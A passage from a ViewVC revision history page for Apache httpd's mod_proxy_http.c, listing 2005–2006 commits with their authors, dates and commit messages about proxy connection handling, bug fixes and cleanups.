(18 years, 5 months ago)
by *mturk*

File length: 67224 byte(s)

Diff to [previous 420983](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=420983&r2=427959)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=420983&r2=427959&diff_format=h))
```
Cleanup: Remove close_on_recycle from proxy_conn_rec.
It behaves the same as close.

```

---

Revision [**420983**](/viewvc?view=revision&revision=420983) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=420983&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=420983&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=420983))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=420983)

Modified
*Tue Jul 11 20:33:53 2006 UTC*
(18 years, 6 months ago)
by *fielding*

File length: 67263 byte(s)

Diff to [previous 414238](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=414238&r2=420983)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=414238&r2=420983&diff_format=h))
```
update license header text

```

---

Revision [**414238**](/viewvc?view=revision&revision=414238) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=414238&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=414238&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=414238))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=414238)

Modified
*Wed Jun 14 13:16:29 2006 UTC*
(18 years, 7 months ago)
by *jorton*

File length: 67116 byte(s)

Diff to [previous 395228](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=395228&r2=414238)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=395228&r2=414238&diff_format=h))
```
* server/core.c (default_handler): Use apr_brigade_insert_file() to
append the file to the brigade.

* server/protocol.c (ap_send_fd),
modules/proxy/mod_proxy_http.c (spool_reqbody_cl),
modules/cache/mod_mem_cache.c (recall_body),
modules/cache/mod_disk_cache.c (recall_body),
modules/mappers/mod_negotiation.c (handle_map_file),
modules/generators/mod_asis.c (asis_handler),
modules/dav/fs/repos.c [DEBUG_GET_HANDLER] (dav_fs_deliver),
modules/arch/win32/mod_isapi.c (ServerSupportFunction): Likewise.

```

---

Revision [**395228**](/viewvc?view=revision&revision=395228) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=395228&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=395228&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=395228))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=395228)

Modified
*Wed Apr 19 12:11:27 2006 UTC*
(18 years, 9 months ago)
by *colm*

File length: 68060 byte(s)

Diff to [previous 394088](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=394088&r2=395228)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=394088&r2=395228&diff_format=h))
```
Update the copyright year in all .c, .h and .xml files

```

---

Revision [**394088**](/viewvc?view=revision&revision=394088) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=394088&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=394088&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=394088))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=394088)

Modified
*Fri Apr 14 13:20:28 2006 UTC*
(18 years, 9 months ago)
by *rpluem*

File length: 68060 byte(s)

Diff to [previous 379237](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=379237&r2=394088)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=379237&r2=394088&diff_format=h))
```
* Avoid calling ap_proxy_http_cleanup twice as this releases a connection
  from the connection pool twice. This causes this connection to be present
  in the connection pool twice. Thus it may be used by different threads
  at the same time which causes many troubles (segfaults in this case).
  Furthermore implement a logic to prevent double releases to the connection
  pool if they are triggered by buggy code and log an error message in this
  case.

  - mod_proxy_http.c: remove double calls to ap_proxy_http_cleanup
  - proxy_util.c: Add logic to prevent double releases of a
    connection to the connection pool.

PR: 38793

```

---

Revision [**379237**](/viewvc?view=revision&revision=379237) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=379237&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=379237&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=379237))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=379237)

Modified
*Mon Feb 20 20:56:50 2006 UTC*
(18 years, 11 months ago)
by *rpluem*

File length: 68170 byte(s)

Diff to [previous 378032](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=378032&r2=379237)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=378032&r2=379237&diff_format=h))
```
* Disable persistent connections for SSL backends again as we do not
  handle them correctly, because we recreate backend->connection for each
  request and thus try to initialize an already existing SSL connection.

Noticed by: Joe Orton

```

---

Revision [**378032**](/viewvc?view=revision&revision=378032) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=378032&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=378032&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=378032))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=378032)

Modified
*Wed Feb 15 16:44:42 2006 UTC*
(18 years, 11 months ago)
by *jim*

File length: 67835 byte(s)

Diff to [previous 377525](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=377525&r2=378032)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=377525&r2=378032&diff_format=h))
```
  *) mod_proxy: Fix KeepAlives not being allowed and set to
     backend servers. PR38602. [Ruediger Pluem, Jim Jagielski]

Also, document previous patch:
  *) Correctly initialize mod_proxy workers, which use a
     combination of local and shared datasets. Adjust logging
     to better trace usage. PR38403. [Jim Jagielski]

```

---

Revision [**377525**](/viewvc?view=revision&revision=377525) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=377525&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=377525&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=377525))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=377525)

Modified
*Mon Feb 13 22:58:03 2006 UTC*
(18 years, 11 months ago)
by *rpluem*

File length: 68896 byte(s)

Diff to [previous 377057](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=377057&r2=377525)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=377057&r2=377525&diff_format=h))
```
* Use the correct pool for apr_table_copy. Otherwise we trigger the bad pool
  ancestry abort in apr_table_copy if apr is compiled with APR_POOL_DEBUG.

Noticed by: Joe Orton

```

---

Revision [**377057**](/viewvc?view=revision&revision=377057) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=377057&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=377057&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=377057))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=377057)

Modified
*Sat Feb 11 21:15:12 2006 UTC*
(18 years, 11 months ago)
by *rpluem*

File length: 68564 byte(s)

Diff to [previous 377053](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=377053&r2=377057)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=377053&r2=377057&diff_format=h))
```
* Do not close the backend connection, because the client sent a
  Connection: close header.

PR: 38524

```

---

Revision [**377053**](/viewvc?view=revision&revision=377053) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=377053&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=377053&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=377053))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=377053)

Modified
*Sat Feb 11 20:57:12 2006 UTC*
(18 years, 11 months ago)
by *rpluem*

File length: 69047 byte(s)

Diff to [previous 366279](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=366279&r2=377053)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=366279&r2=377053&diff_format=h))
```
* Do not remove the connection headers from r->headers_in. They are needed
  by the http output filter to create the correct connection response headers.
  Instead work on a copy of r->headers_in.

PR: 38524

```

---

Revision [**366279**](/viewvc?view=revision&revision=366279) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=366279&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=366279&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=366279))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=366279)

Modified
*Thu Jan 5 21:02:36 2006 UTC*
(19 years ago)
by *rpluem*

File length: 68944 byte(s)

Diff to [previous 365374](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=365374&r2=366279)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=365374&r2=366279&diff_format=h))
```
* Call ap_proxy_http_cleanup after ap_log_rerror because it resets
  backend->hostname to NULL.

```

---

Revision [**365374**](/viewvc?view=revision&revision=365374) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=365374&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=365374&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=365374))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=365374)

Modified
*Mon Jan 2 16:39:22 2006 UTC*
(19 years ago)
by *rpluem*

File length: 68944 byte(s)

Diff to [previous 358022](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=358022&r2=365374)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=358022&r2=365374&diff_format=h))
```
* Correctly signal broken backend connections up the chain also for the ajp
  backend (see also [r357461](/viewvc?view=revision&revision=357461)). Furthermore move common code in mod_proxy_http.c
  and mod_proxy_ajp.c into a new function (ap_proxy_backend_broke) in
  proxy_util.c.

  modules/proxy/mod_proxy_ajp.c : Signal broken backend connection for ajp backend
  modules/proxy/proxy_util.c    : Add ap_proxy_backend_broke
  modules/proxy/mod_proxy_http.c: - Use ap_proxy_backend_broke
                                  - Return DONE also if backend broke
  modules/proxy/mod_proxy.h     : Add declaration of ap_proxy_backend_broke

```

---

Revision [**358022**](/viewvc?view=revision&revision=358022) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=358022&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=358022&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=358022))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=358022)

Modified
*Tue Dec 20 15:50:37 2005 UTC*
(19 years, 1 month ago)
by *jim*

File length: 69177 byte(s)

Diff to [previous 357461](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=357461&r2=358022)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=357461&r2=358022&diff_format=h))
```
Morph the ap_http_broken_backend_filter() proxy "specific"
filter to a generic http error handling output filter.

```

---

Revision [**357461**](/viewvc?view=revision&revision=357461) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=357461&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=357461&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=357461))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=357461)

Modified
*Sun Dec 18 12:07:39 2005 UTC*
(19 years, 1 month ago)
by *rpluem*

File length: 69114 byte(s)

Diff to [previous 355853](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=355853&r2=357461)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=355853&r2=357461&diff_format=h))
```
* If the mod_proxy backend connection broke in the middle of the response,
  then
  - Do not cache it.
  - Signal the client that something went wrong by closing the connection
    and not sending the last-chunk marker if the response was T-E chunked.

server/core_filters.c         : Close the connection to the client by setting
                                c->keepalive to AP_CONN_CLOSE.
modules/http/chunk_filter.c   : Do not send last-chunk marker in the case
                                the backend broke.
modules/proxy/mod_proxy_http.c: Signal that the backend connection broke.
modules/cache/mod_disk_cache.c: Respect r->no_cache for discarding the response

Submitted by: Roy T. Fielding, Jim Jagielski, Ruediger Pluem
Reviewed by: Roy T. Fielding, Jim Jagielski, Ruediger Pluem

```

---

Revision [**355853**](/viewvc?view=revision&revision=355853) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=355853&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=355853&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=355853))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=355853)

Modified
*Sun Dec 11 01:28:13 2005 UTC*
(19 years, 1 month ago)
by *rpluem*

File length: 68739 byte(s)

Diff to [previous 355823](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=355823&r2=355853)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=355823&r2=355853&diff_format=h))
```
* revert [r355823](/viewvc?view=revision&revision=355823) and [r355837](/viewvc?view=revision&revision=355837)

```

---

Revision [**355823**](/viewvc?view=revision&revision=355823) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=355823&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=355823&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=355823))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=355823)

Modified
*Sun Dec 11 00:15:27 2005 UTC*
(19 years, 1 month ago)
by *rpluem*

File length: 68788 byte(s)

Diff to [previous 354636](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=354636&r2=355823)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=354636&r2=355823&diff_format=h))
```
* Move handling of backends that broke after the headers have been sent
  into the proxy handler of mod_proxy.

  This patch still sets r->connection->aborted to 1 which is currently
  vetoed by Roy. Moving it from the scheme handler to the proxy handler
  should ease the reimplementation of this, as the scheme handlers only
  needs to return PROXY_BACKEND_BROKEN to signal the above situation to
  the proxy handler.

  mod_proxy.h: Add define for PROXY_BACKEND_BROKEN
  mod_proxy.c: Handle PROXY_BACKEND_BROKEN in proxy handler
  mod_proxy_http.c: Sent back PROXY_BACKEND_BROKEN if backend broke
  after we sent the headers.

```

---

Revision [**354636**](/viewvc?view=revision&revision=354636) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=354636&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=354636&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=354636))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=354636)

Modified
*Wed Dec 7 00:44:13 2005 UTC*
(19 years, 1 month ago)
by *jerenkrantz*

File length: 68739 byte(s)

Diff to [previous 354628](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=354628&r2=354636)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=354628&r2=354636&diff_format=h))
```
Add a comment and use proper grammar for another comment.
(No functional changes.)

```

---

Revision [**354628**](/viewvc?view=revision&revision=354628) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=354628&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=354628&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=354628))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=354628)

Modified
*Wed Dec 7 00:18:58 2005 UTC*
(19 years, 1 month ago)
by *jerenkrantz*

File length: 68521 byte(s)

Diff to [previous 332306](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=332306&r2=354628)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=332306&r2=354628&diff_format=h))
```
If we get an error reading the upstream response, we should bail.

Reported by: Brian Akins

```

---

Revision [**332306**](/viewvc?view=revision&revision=332306) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=332306&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=332306&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=332306))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=332306)

Modified
*Thu Nov 10 15:11:44 2005 UTC*
(19 years, 2 months ago)
by *jim*

File length: 68353 byte(s)

Diff to [previous 327590](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=327590&r2=332306)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=327590&r2=332306&diff_format=h))
```
No functional Change: Removing trailing whitespace. This also
means that "blank" lines consisting of just spaces or
tabs are now really blank lines

```

---

Revision [**327590**](/viewvc?view=revision&revision=327590) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=327590&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=327590&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=327590))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=327590)

Modified
*Fri Oct 21 21:50:46 2005 UTC*
(19 years, 3 months ago)
by *rpluem*

File length: 68523 byte(s)

Diff to [previous 231355](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=231355&r2=327590)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=231355&r2=327590&diff_format=h))
```
* Fix PR37145 (data loss with httpd-2.0.55 reverse proxy method=post) by
  exchanging APR_BRIGADE_CONCAT with ap_save_brigade to ensure that
  transient buckets get setaside correctly between various iterations of
  ap_get_brigade calls.

Reviewed by: Joe Orton, William Rowe, Jim Jagielski, Jeff Trawick

```

---

Revision [**231355**](/viewvc?view=revision&revision=231355) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=231355&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=231355&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=231355))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=231355)

Modified
*Wed Aug 10 23:36:39 2005 UTC*
(19 years, 5 months ago)
by *niq*

File length: 65686 byte(s)

Diff to [previous 231114](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=231114&r2=231355)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=231114&r2=231355&diff_format=h))
```
Fix ProxyPassReverse & family to work correctly in <Location>

```

---

Revision [**231114**](/viewvc?view=revision&revision=231114) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=231114&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=231114&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=231114))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=231114)

Modified
*Tue Aug 9 21:15:40 2005 UTC*
(19 years, 5 months ago)
by *jorton*

File length: 65592 byte(s)

Diff to [previous 231046](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=231046&r2=231114)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=231046&r2=231114&diff_format=h))
```
* modules/proxy/mod_proxy_http.c (stream_reqbody_cl): Fix gcc warning.

```

---

Revision [**231046**](/viewvc?view=revision&revision=231046) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=231046&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=231046&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=231046))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=231046)

Modified
*Tue Aug 9 14:54:46 2005 UTC*
(19 years, 5 months ago)
by *wrowe*

File length: 65578 byte(s)

Diff to [previous 230745](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230745&r2=231046)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230745&r2=231046&diff_format=h))
```

  Hopefully, address the last edge case where status may
  be uninitialized.  Asserts in non-debug builds are bad things,
  anyways, so this is probably more correct.  This should fix
  -Werror compile warning observed by Joe Orton.

```

---

Revision [**230745**](/viewvc?view=revision&revision=230745) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230745&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230745&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=230745))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=230745)

Modified
*Mon Aug 8 03:34:57 2005 UTC*
(19 years, 5 months ago)
by *wrowe*

File length: 65540 byte(s)

Diff to [previous 230739](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230739&r2=230745)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230739&r2=230745&diff_format=h))
```

  Two blank lines for clarity; whitespace only change.

```

---

Revision [**230739**](/viewvc?view=revision&revision=230739) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230739&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230739&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=230739))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=230739)

Modified
*Mon Aug 8 03:12:24 2005 UTC*
(19 years, 5 months ago)
by *wrowe*

File length: 65538 byte(s)

Diff to [previous 230735](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230735&r2=230739)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230735&r2=230739&diff_format=h))
```

  We already accept 80 bytes less than the client body's anticipated
  size, so we don't need to also prefetch an extra 1024 bytes; this
  was redundant.

```

---

Revision [**230735**](/viewvc?view=revision&revision=230735) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230735&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230735&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=230735))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=230735)

Modified
*Mon Aug 8 02:57:55 2005 UTC*
(19 years, 5 months ago)
by *wrowe*

File length: 65545 byte(s)

Diff to [previous 230733](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230733&r2=230735)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230733&r2=230735&diff_format=h))
```

  Drop an impossible case; the while() loop already protected us
  from this situation.

```

---

Revision [**230733**](/viewvc?view=revision&revision=230733) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230733&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230733&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=230733))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=230733)

Modified
*Mon Aug 8 02:51:32 2005 UTC*
(19 years, 5 months ago)
by *wrowe*

File length: 65799 byte(s)

Diff to [previous 230718](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230718&r2=230733)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=230718&r2=230733&diff_format=h))
```

  Fix a double-termination case in svn trunk/; we terminated the
  headers up-front knowing the resulting headers were already
  correctly composed.

```

---

Revision [**230718**](/viewvc?view=revision&revision=230718) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230718&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=230718&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=230718))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=230718)

Modified
*Mon Aug 8 00:57:52 2005 UTC*
(19 years, 5 months ago)
by *wrowe*

File length: 65856 byte(s)

Diff to [previous 224721](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=224721&r2=230718)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=224721&r2=230718&diff_format=h))
```

  An impossible-to-hit edge case today; we described the request
  as chunked - and if chunked always send the body termination "0"
  chunk header.

  Roy's requested change that we always send a body we could read
  in full as a C-L request ensures this code wasn't triggered; some
  change in the future could again reveal this edge case.

```

---

Revision [**224721**](/viewvc?view=revision&revision=224721) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=224721&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=224721&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=224721))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=224721)

Modified
*Mon Jul 25 12:44:40 2005 UTC*
(19 years, 6 months ago)
by *jorton*

File length: 65735 byte(s)

Diff to [previous 219533](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219533&r2=224721)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219533&r2=224721&diff_format=h))
```
* modules/proxy/mod_proxy_http.c (stream_reqbody_cl): Fix format
string error.
(ap_proxy_http_request): Restore default case in rb_method switch to
fix gcc warnings.

```

---

Revision [**219533**](/viewvc?view=revision&revision=219533) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219533&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219533&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=219533))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=219533)

Modified
*Mon Jul 18 16:48:25 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 65681 byte(s)

Diff to [previous 219430](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219430&r2=219533)
